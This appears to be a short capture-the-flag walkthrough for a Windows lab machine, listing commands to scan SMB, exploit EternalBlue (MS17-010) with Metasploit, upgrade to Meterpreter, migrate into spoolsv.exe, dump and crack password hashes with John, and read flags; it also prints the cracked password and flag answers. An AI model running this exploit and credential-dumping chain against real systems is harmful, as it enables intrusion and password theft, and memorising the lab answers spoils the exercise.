# BASIC INFO

```
export IP=10.10.118.163


```

# EXPLOIT

```
nmap --script=smb* $IP

```
> Vulnerable to eternal blue
```
msfconsole
search eternalblue type:exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.118.163
run

```

# GET METERPRETER

```
ctrl^z to background the session
use post/multi/manage/shell_to_meterpreter
set session 1
exploit
sessions 2
shell
whoami
ctrl^z
ps

```
> Note down pid of spoolsv.exe
> pid=2568

# JOHN THE RIPPER

```
migrate 2568
hashdump
```
> copy the hash and save to a file
```
john hash --wordlist=/usr/share/wordllists/rockyou.txt
password = alqfna22

```

# FINDING THE FLAG

```
cd C:/
cat flag1.txt
flag1: access_the_machine
```

> Google windows sam location

```
C:/Users/System32/config
cat flag2.txt
flag2:sam_database_elevated_access

search -f flag3.txt
cat flag3.txt
flag3:admin_documents_can_be_valuable
```